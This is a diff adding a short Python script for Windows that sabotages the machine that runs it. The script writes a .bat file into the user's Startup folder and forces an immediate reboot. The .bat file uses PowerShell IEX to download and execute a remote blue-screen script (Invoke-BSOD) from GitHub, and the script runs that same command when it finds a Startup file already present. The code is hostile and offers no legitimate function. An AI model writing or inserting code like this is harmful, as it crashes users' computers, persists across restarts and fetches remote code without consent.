@@ -1,0 +1,9 @@
+import os
+
+if os.path.exists(os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup\ahdalkjsadkhjdsalbkfdncxzlv.bat")):
+    os.system("powershell -nologo -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD")
+else:
+    startup_path = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
+    payload = open(startup_path+r"\dsaksdbanladlkdnsad.bat", "wt")
+    payload.write("powershell -nologo -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD")
+    os.system("shutdown -r -f -t 0")
